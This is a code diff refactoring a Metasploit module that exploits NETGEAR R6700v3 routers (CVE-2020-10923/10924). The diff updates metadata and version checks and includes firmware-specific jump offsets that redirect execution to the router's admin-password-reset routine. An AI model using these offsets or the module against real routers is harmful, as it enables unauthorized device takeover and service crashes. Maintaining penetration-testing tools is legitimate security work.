@@ -33,30 +33,29 @@ class MetasploitModule < Msf::Auxiliary
           Radek Domanski).
         },
         'License' => MSF_LICENSE,
-        'Author' =>
-        [
+        'Author' => [
           'Pedro Ribeiro <pedrib[at]gmail.com>', # Twitter: @pedrib1337. Vulnerability discovery and Metasploit module
           'Radek Domanski <radek.domanski[at]gmail.com>', # Twitter: @RabbitPro. Vulnerability discovery and Metasploit module
           'gwillcox-r7' # Minor general updates plus updated implementation of the check method to identify a wider range of vulnerable targets.
         ],
-        'References' =>
-          [
-            [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2019/tokyo_drift/tokyo_drift.md'],
-            [ 'URL', 'https://kb.netgear.com/000061982/Security-Advisory-for-Multiple-Vulnerabilities-on-Some-Routers-Mobile-Routers-Modems-Gateways-and-Extenders'],
-            [ 'CVE', '2020-10923'],
-            [ 'CVE', '2020-10924'],
-            [ 'ZDI', '20-703'],
-            [ 'ZDI', '20-704']
-          ],
-        'Notes' => # Note that reliability isn't included here, as technically the exploit can only
-            # only be run once, after which the service crashes.
-            {
-              'SideEffects' => [ CONFIG_CHANGES ], # This module will change the configuration by
-              # resetting the router to the default factory password.
-              'Stability' => [ CRASH_SERVICE_DOWN ] # This module will crash the target service after it is run.
-            },
-        'RelatedModules' => [ 'exploit/linux/telnet/netgear_telnetenable' ], # This module relies on users also running exploit/linux/telnet/netgear_telnetenable to get the shell.
-        'DisclosureDate' => 'Jun 15 2020',
+        'References' => [
+          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2019/tokyo_drift/tokyo_drift.md'],
+          [ 'URL', 'https://kb.netgear.com/000061982/Security-Advisory-for-Multiple-Vulnerabilities-on-Some-Routers-Mobile-Routers-Modems-Gateways-and-Extenders'],
+          [ 'CVE', '2020-10923'],
+          [ 'CVE', '2020-10924'],
+          [ 'ZDI', '20-703'],
+          [ 'ZDI', '20-704']
+        ],
+        # Note that reliability isn't included here, as technically the exploit can only
+        # only be run once, after which the service crashes.
+        'Notes' => {
+          'SideEffects' => [ CONFIG_CHANGES ], # This module will change the configuration by
+          # resetting the router to the default factory password.
+          'Stability' => [ CRASH_SERVICE_DOWN ], # This module will crash the target service after it is run.
+          'Reliability' => [],
+          'RelatedModules' => [ 'exploit/linux/telnet/netgear_telnetenable' ] # This module relies on users also running exploit/linux/telnet/netgear_telnetenable to get the shell.
+        },
+        'DisclosureDate' => '2020-06-15',
         'DefaultTarget' => 0
       )
     )
@@ -94,33 +93,31 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::UnexpectedReply, 'Failed to obtain device version: Unexpected response code')
     end
 
-    version = res.body.to_s
-    version = version.scan(/V\d\.\d\.\d\.\d{1,2}/) # Try find a version number in the format V1.2.3.48 or similar.
+    version = res.body.to_s.scan(/V(\d\.\d\.\d\.\d{1,2})/).flatten.first # Try find a version number in the format V1.2.3.48 or similar.
     if version.nil? # Check we actually got a result.
       fail_with(Failure::UnexpectedReply, 'Failed to obtain device version: no version number found in response') # Taken from https://stackoverflow.com/questions/4115115/extract-a-substring-from-a-string-in-ruby-using-a-regular-expression
     end
-    raw_version_number = version[0].gsub('V', '') # If we got a result, then take the first result from the returned array, and remove the leading 'V'.
-    Gem::Version.new(raw_version_number) # Finally lets turn it into a Gem::Version object for later use in other parts of the code.
+    Rex::Version.new(version) # Finally lets turn it into a Rex::Version object for later use in other parts of the code.
   end
 
   def check
     target_version = retrieve_version
     print_status("Target is running firmware version #{target_version}")
-    if (target_version < Gem::Version.new('1.0.4.94')) && (target_version >= Gem::Version.new('1.0.2.62'))
-      return Exploit::CheckCode::Appears
+    if (target_version < Rex::Version.new('1.0.4.94')) && (target_version >= Rex::Version.new('1.0.2.62'))
+      return Exploit::CheckCode::Appears("NETGEAR R6700 firmware #{target_version} is in the vulnerable range")
     else
-      return Exploit::Checkcode::Safe
+      return Exploit::CheckCode::Safe("NETGEAR R6700 firmware #{target_version} is not vulnerable")
     end
   end
 
   def find_offset
     target_version = retrieve_version
-    if target_version == Gem::Version.new('1.0.4.84')
+    if target_version == Rex::Version.new('1.0.4.84')
       print_status("#{peer} - Identified Netgear R6700v3 (firmware V1.0.0.4.84_10.0.58) as the target.")
       # this offset is where execution will jump to
       # a part in the middle of the binary that resets the admin password
       return "\x58\x9a\x03"
-    elsif target_version == Gem::Version.new('1.0.4.82')
+    elsif target_version == Rex::Version.new('1.0.4.82')
       print_status("#{peer} - Identified Netgear R6700v3 (firmware V1.0.0.4.82_10.0.57) as the target.")
       return "\x48\x9a\x03"
     end
